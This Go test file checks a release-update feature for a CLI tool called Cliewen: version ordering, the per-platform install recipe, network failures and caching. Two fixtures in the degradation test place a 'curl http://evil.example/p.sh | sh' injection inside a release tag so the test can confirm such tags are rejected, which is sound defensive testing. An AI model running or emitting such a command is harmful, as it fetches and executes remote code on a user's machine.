package release

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// errOffline is a transport failure with no server on the other end; errTimeout
// is one that timed out. They are distinct because the milestone names them
// separately, and identical in outcome because both mean "could not tell".
type errOffline struct{}

func (errOffline) Error() string { return "dial tcp: no such host" }

type errTimeout struct{}

func (errTimeout) Error() string   { return "context deadline exceeded" }
func (errTimeout) Timeout() bool   { return true }
func (errTimeout) Temporary() bool { return true }

// answering serves one canned reply to every request and counts how many it
// was asked for. The network is injected, so no test here reaches a live
// service and no verdict depends on which machine ran it (ADR-042).
type answering struct {
	status int
	body   string
	err    error
	calls  int
}

func (a *answering) RoundTrip(r *http.Request) (*http.Response, error) {
	a.calls++
	if a.err != nil {
		return nil, a.err
	}
	return &http.Response{
		StatusCode: a.status,
		Body:       io.NopCloser(strings.NewReader(a.body)),
		Header:     make(http.Header),
		Request:    r,
	}, nil
}

func serving(status int, body string) *answering {
	return &answering{status: status, body: body}
}

func failing(err error) *answering { return &answering{err: err} }

func (a *answering) client() *http.Client { return &http.Client{Transport: a} }

// TestAC075_UnitPositive_EachPlatformGetsItsOwnRoute proves the branch the
// milestone names: the machine decides which single recipe is printed.
func TestAC075_UnitPositive_EachPlatformGetsItsOwnRoute(t *testing.T) {
	cases := []struct {
		platform Platform
		want     string
	}{
		{Platform{"windows", "amd64"}, "install.ps1"},
		{Platform{"windows", "arm64"}, "install.ps1"},
		{Platform{"darwin", "arm64"}, "install.sh"},
		{Platform{"linux", "amd64"}, "install.sh"},
		// No release publishes an asset for these, so the source route is the
		// only one that works — pinned to the release just reported.
		{Platform{"freebsd", "amd64"}, "go install github.com/cliewen/cliewen/cmd/clue@v0.12.0"},
		{Platform{"linux", "386"}, "go install github.com/cliewen/cliewen/cmd/clue@v0.12.0"},
	}
	for _, c := range cases {
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{
			Current:  "0.11.2",
			Platform: c.platform,
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Known || !got.Behind || got.Latest != "0.12.0" {
			t.Fatalf("%v: expected a known newer release, got %+v", c.platform, got)
		}
		if len(got.Recipe) != 1 {
			t.Fatalf("%v: expected exactly one route, got %v", c.platform, got.Recipe)
		}
		if !strings.Contains(got.Recipe[0], c.want) {
			t.Fatalf("%v: expected %q, got %q", c.platform, c.want, got.Recipe[0])
		}
		// The two routes this machine is not on must not appear at all: a
		// reader who has to skip past wrong lines is what the branch avoids.
		for _, wrong := range []string{"install.ps1", "install.sh", "go install"} {
			if wrong != c.want && !strings.Contains(c.want, wrong) && strings.Contains(got.Recipe[0], wrong) {
				t.Fatalf("%v: route names another platform's recipe: %q", c.platform, got.Recipe[0])
			}
		}
	}
}

// TestAC075_UnitNegative_ACurrentOrSourceBuildIsNotBehind holds the other
// direction: nothing to catch up with means no recipe to print.
func TestAC075_UnitNegative_ACurrentOrSourceBuildIsNotBehind(t *testing.T) {
	for _, current := range []string{"0.12.0", "0.13.0", "dev", ""} {
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{
			Current:  current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Known {
			t.Fatalf("%q: the release should still be known", current)
		}
		if got.Behind {
			t.Fatalf("%q: must not be reported behind %s", current, got.Latest)
		}
		if len(got.Recipe) != 0 {
			t.Fatalf("%q: expected no recipe, got %v", current, got.Recipe)
		}
	}
}

// TestAC077_UnitPositive_ACandidateIsBehindTheReleaseItNames holds the
// ordering rule: a pre-release carries the numbers of the release it is a
// candidate for, and the moment that release ships is exactly when its user
// needs to hear it. Comparing by numbers alone would call them equal and say
// nothing.
func TestAC077_UnitPositive_ACandidateIsBehindTheReleaseItNames(t *testing.T) {
	for _, current := range []string{"0.13.0-rc1", "0.13.0-alpha.2", "v0.13.0-rc1"} {
		net := serving(http.StatusOK, `{"tag_name":"v0.13.0"}`)
		got := Check(Options{
			Current:  current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Behind {
			t.Fatalf("%q: a candidate for 0.13.0 is behind 0.13.0, got %+v", current, got)
		}
		if got.Ahead {
			t.Fatalf("%q: a candidate for a published release is not ahead of it", current)
		}
		if len(got.Recipe) != 1 || !strings.Contains(got.Recipe[0], "install.sh") {
			t.Fatalf("%q: expected the route for this machine, got %v", current, got.Recipe)
		}
	}
}

// TestAC077_UnitNegative_BuildMetadataAndUnpublishedNumbersAreNotBehind holds
// the other side of the same rule. "+" is build metadata: it orders with the
// release it decorates, not before it. And a stamp whose numbers are newer
// than anything published is not behind — but it is not the newest release
// either, because the list never named it.
func TestAC077_UnitNegative_BuildMetadataAndUnpublishedNumbersAreNotBehind(t *testing.T) {
	cases := []struct {
		current    string
		tag        string
		wantAhead  bool
		wantReason string
	}{
		{"0.13.0+dirty", "v0.13.0", false, "build metadata orders with its release"},
		{"0.13.0+build.7", "v0.13.0", false, "build metadata orders with its release"},
		{"0.13.0", "v0.12.0", true, "newer numbers than anything published"},
		{"0.13.0-rc1", "v0.12.0", true, "a candidate for an unpublished release"},
	}
	for _, c := range cases {
		net := serving(http.StatusOK, `{"tag_name":"`+c.tag+`"}`)
		got := Check(Options{
			Current:  c.current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if got.Behind {
			t.Fatalf("%q vs %s: must not be behind (%s), got %+v", c.current, c.tag, c.wantReason, got)
		}
		if len(got.Recipe) != 0 {
			t.Fatalf("%q vs %s: nothing to catch up with, so no recipe: %v", c.current, c.tag, got.Recipe)
		}
		if got.Ahead != c.wantAhead {
			t.Fatalf("%q vs %s: Ahead = %v, want %v (%s)", c.current, c.tag, got.Ahead, c.wantAhead, c.wantReason)
		}
	}
}

// TestAC077_UnitPositive_EveryDegradationIsUnknown covers all four the
// milestone names. Each means "could not tell", and that is one answer.
func TestAC077_UnitPositive_EveryDegradationIsUnknown(t *testing.T) {
	cases := map[string]*answering{
		"offline":             failing(errOffline{}),
		"timeout":             failing(errTimeout{}),
		"rate limit":          serving(http.StatusForbidden, `{"message":"API rate limit exceeded"}`),
		"too many requests":   serving(http.StatusTooManyRequests, ``),
		"unrecognized body":   serving(http.StatusOK, `<html>maintenance</html>`),
		"unrecognized fields": serving(http.StatusOK, `{"name":"0.12.0"}`),
		"unparseable tag":     serving(http.StatusOK, `{"tag_name":"nightly"}`),
		// What this command prints is a command the user is told to run, so a
		// tag carrying anything but three numbers is not recognized at all.
		"tag carrying a command":     serving(http.StatusOK, `{"tag_name":"v0.12.0-x; curl http://evil.example/p.sh | sh"}`),
		"tag carrying a new line":    serving(http.StatusOK, "{\"tag_name\":\"v0.12.0\ncurl http://evil.example/p.sh | sh\"}"),
		"tag carrying a signed part": serving(http.StatusOK, `{"tag_name":"v0.+12.0"}`),
	}
	for name, net := range cases {
		got := Check(Options{
			Current:  "0.11.2",
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if got.Known {
			t.Fatalf("%s: expected an unknown answer, got %+v", name, got)
		}
		if got.Behind || len(got.Recipe) != 0 {
			t.Fatalf("%s: an unknown answer must claim nothing, got %+v", name, got)
		}
	}
}

// TestAC077_UnitNegative_AnUnknownAnswerIsNeverCached keeps a failed request
// from silencing the next one: absence must not be stored as an answer.
func TestAC077_UnitNegative_AnUnknownAnswerIsNeverCached(t *testing.T) {
	dir := t.TempDir()
	down := failing(errOffline{})
	if got := Check(Options{Current: "0.11.2", Client: down.client(), CacheDir: dir}); got.Known {
		t.Fatalf("expected unknown, got %+v", got)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Fatalf("an unknown answer was written to the cache: %v", entries)
	}
	// The other way an answer becomes unknown is a reply that arrived and was
	// not recognized. It must not be stored either — a cached tag nothing can
	// read would cost a request on every call and teach nothing.
	odd := serving(http.StatusOK, `{"tag_name":"nightly"}`)
	if got := Check(Options{Current: "0.11.2", Client: odd.client(), CacheDir: dir}); got.Known {
		t.Fatalf("expected unknown, got %+v", got)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Fatalf("an unrecognized answer was written to the cache: %v", entries)
	}
	up := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	if got := Check(Options{Current: "0.11.2", Client: up.client(), CacheDir: dir}); !got.Known {
		t.Fatalf("the next call must ask again, got %+v", got)
	}
}

// TestAC077_UnitNegative_AnErrorStatusIsNotAnAnswer holds the guard the other
// degradation fixtures never reach: each of those carries a body that fails to
// parse anyway, so the status check itself is never what produces "could not
// tell". A rate limit, a proxy error page, or a mirror's error envelope can
// carry a perfectly well-formed tag, and reading it would let this command
// report a release the release list never gave.
func TestAC077_UnitNegative_AnErrorStatusIsNotAnAnswer(t *testing.T) {
	for _, status := range []int{
		http.StatusForbidden,
		http.StatusTooManyRequests,
		http.StatusNotFound,
		http.StatusInternalServerError,
	} {
		dir := t.TempDir()
		net := serving(status, `{"tag_name":"v9.9.9"}`)
		got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir})
		if got.Known {
			t.Fatalf("status %d: a well-formed tag on an error status is not an answer, got %+v", status, got)
		}
		if got.Behind || got.Latest != "" {
			t.Fatalf("status %d: nothing may be reported from it, got %+v", status, got)
		}
		if entries, _ := os.ReadDir(dir); len(entries) != 0 {
			t.Fatalf("status %d: it must not be cached either: %v", status, entries)
		}
	}
}

// recording keeps the request itself, which every other round-tripper here
// answers without looking at. The address and the verb are the two things a
// user's machine cannot check for itself.
type recording struct {
	req *http.Request
}

func (r *recording) RoundTrip(req *http.Request) (*http.Response, error) {
	r.req = req
	return serving(http.StatusOK, `{"tag_name":"v0.12.0"}`).RoundTrip(req)
}

// TestSanity_TheRequestIsTheOneTheDesignDescribes pins what the shipped binary
// actually asks for. Every other test injects a transport that answers whatever
// it is handed, so the one constant deciding which release list is consulted —
// and the verb used to consult it — is invisible to all of them. A wrong path
// or a wrong method is a permanent, silent "could not tell", which is the exact
// failure this command exists to remove.
func TestSanity_TheRequestIsTheOneTheDesignDescribes(t *testing.T) {
	rec := &recording{}
	got := Check(Options{
		Current:  "0.11.2",
		Platform: Platform{"linux", "amd64"},
		Client:   &http.Client{Transport: rec},
		CacheDir: t.TempDir(),
	})
	if !got.Known {
		t.Fatalf("expected an answer, got %+v", got)
	}
	if rec.req == nil {
		t.Fatal("no request was made at all")
	}
	if rec.req.Method != http.MethodGet {
		t.Errorf("a release list is read, not written: method %s", rec.req.Method)
	}
	const want = "https://api.github.com/repos/cliewen/cliewen/releases/latest"
	if rec.req.URL.String() != want {
		t.Errorf("the check asks %s, but Cliewen publishes at %s", rec.req.URL, want)
	}
	if accept := rec.req.Header.Get("Accept"); accept != "application/vnd.github+json" {
		t.Errorf("the host is asked for its documented representation, got %q", accept)
	}
}

// TestAC077_UnitNegative_AnUnboundedBodyIsNotRead holds the bound the package
// comment states. This runs at every session start, so a host that answers with
// something enormous must cost a bounded read and then mean "could not tell"
// like every other unrecognized answer.
func TestAC077_UnitNegative_AnUnboundedBodyIsNotRead(t *testing.T) {
	// Well-formed JSON carrying the right field, and far past the bound: only
	// the limit can be what refuses it.
	huge := `{"padding":"` + strings.Repeat("x", 2<<20) + `","tag_name":"v0.12.0"}`
	net := serving(http.StatusOK, huge)
	got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: t.TempDir()})
	if got.Known {
		t.Fatalf("a body past the bound is not an answer, got %+v", got)
	}
}

// TestAC078_UnitNegative_TheLifetimeIsTheOneDocumented pins the boundary itself.
// Every carrier says a day; a cache that quietly stood for two would report a
// release that shipped yesterday as the newest one.
func TestAC078_UnitNegative_TheLifetimeIsTheOneDocumented(t *testing.T) {
	cases := []struct {
		age       time.Duration
		wantFresh bool
	}{
		{23 * time.Hour, true},
		{24*time.Hour - time.Minute, true},
		{24 * time.Hour, false}, // the boundary belongs to the stale side
		{25 * time.Hour, false},
	}
	for _, c := range cases {
		dir := t.TempDir()
		now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
		writeCache(dir, cached{Tag: "v0.12.0", Fetched: now.Add(-c.age)})
		net := serving(http.StatusOK, `{"tag_name":"v0.13.0"}`)
		got := Check(Options{
			Current:  "0.11.2",
			Client:   net.client(),
			CacheDir: dir,
			Now:      func() time.Time { return now },
		})
		fresh := net.calls == 0
		if fresh != c.wantFresh {
			t.Errorf("age %v: cache used = %v, want %v (answer %s)", c.age, fresh, c.wantFresh, got.Latest)
		}
	}
}

// TestAC078_UnitPositive_AFreshCacheCostsNoRequest is what makes running this
// at every session start acceptable to the host as well as to the user.
func TestAC078_UnitPositive_AFreshCacheCostsNoRequest(t *testing.T) {
	dir := t.TempDir()
	now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)

	first := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return now }})
	if !first.Known || net.calls != 1 {
		t.Fatalf("expected one request and a known answer, got %+v after %d call(s)", first, net.calls)
	}
	// The cache is a file in the given directory, and nothing else was written.
	path := filepath.Join(dir, "latest-release.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("expected the answer cached at %s: %v", path, err)
	}
	var stored cached
	if err := json.Unmarshal(data, &stored); err != nil || stored.Tag != "v0.12.0" {
		t.Fatalf("unexpected cache contents %q (%v)", data, err)
	}

	later := now.Add(23 * time.Hour)
	second := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return later }})
	if net.calls != 1 {
		t.Fatalf("a fresh cache must cost no request, got %d call(s)", net.calls)
	}
	if !second.Known || second.Latest != "0.12.0" {
		t.Fatalf("expected the cached answer, got %+v", second)
	}
}

// redirectUserCacheDir points os.UserCacheDir at a temporary directory, per
// platform, so the default path can be exercised without writing into the real
// one. Without this the default branch is never executed by any test, and the
// clause it implements — never inside the repository — would survive being
// changed to a relative path.
func redirectUserCacheDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	switch runtime.GOOS {
	case "windows":
		t.Setenv("LocalAppData", dir)
	case "darwin":
		t.Setenv("HOME", dir)
		dir = filepath.Join(dir, "Library", "Caches")
	default:
		t.Setenv("XDG_CACHE_HOME", dir)
	}
	return dir
}

// TestAC078_UnitPositive_TheDefaultCacheIsOutsideTheRepository executes the
// path a real run takes: no cache directory given, and the working directory
// is a repository that must be left untouched.
func TestAC078_UnitPositive_TheDefaultCacheIsOutsideTheRepository(t *testing.T) {
	cacheRoot := redirectUserCacheDir(t)
	repo := t.TempDir()
	t.Chdir(repo)

	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	got := Check(Options{Current: "0.11.2", Platform: Platform{"linux", "amd64"}, Client: net.client()})
	if !got.Known || !got.Behind {
		t.Fatalf("expected a known newer release, got %+v", got)
	}

	want := filepath.Join(cacheRoot, "cliewen", "latest-release.json")
	if _, err := os.Stat(want); err != nil {
		t.Fatalf("expected the answer cached at %s: %v", want, err)
	}
	entries, err := os.ReadDir(repo)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Fatalf("the cache was written into the working repository: %v", entries)
	}
}

// TestAC078_UnitNegative_StaleAndBrokenCachesAreAbsence proves the three ways
// a cache stops counting. None of them is an error: a cache that can fail a
// command is worse than no cache.
func TestAC078_UnitNegative_StaleAndBrokenCachesAreAbsence(t *testing.T) {
	now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
	cases := map[string]string{
		"stale":           `{"tag":"v0.9.0","fetched":"2026-07-01T12:00:00Z"}`,
		"unreadable":      "\x00 not json at all",
		"nonsense":        `{"tag":"nightly","fetched":"2026-08-02T11:00:00Z"}`,
		"from the future": `{"tag":"v0.9.0","fetched":"2027-01-01T00:00:00Z"}`,
	}
	for name, contents := range cases {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "latest-release.json"), []byte(contents), 0o644); err != nil {
			t.Fatal(err)
		}
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return now }})
		if net.calls != 1 {
			t.Fatalf("%s: expected the host to be asked, got %d call(s)", name, net.calls)
		}
		if !got.Known || got.Latest != "0.12.0" {
			t.Fatalf("%s: expected the fresh answer, got %+v", name, got)
		}
	}

	// A cache directory that cannot be written is absence too: the answer is
	// already in hand, so the only cost is asking again next time.
	blocked := filepath.Join(t.TempDir(), "file-where-a-directory-should-be")
	if err := os.WriteFile(blocked, []byte("not a directory"), 0o644); err != nil {
		t.Fatal(err)
	}
	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: filepath.Join(blocked, "cliewen")})
	if !got.Known || !got.Behind {
		t.Fatalf("an unwritable cache must not affect the answer, got %+v", got)
	}
}
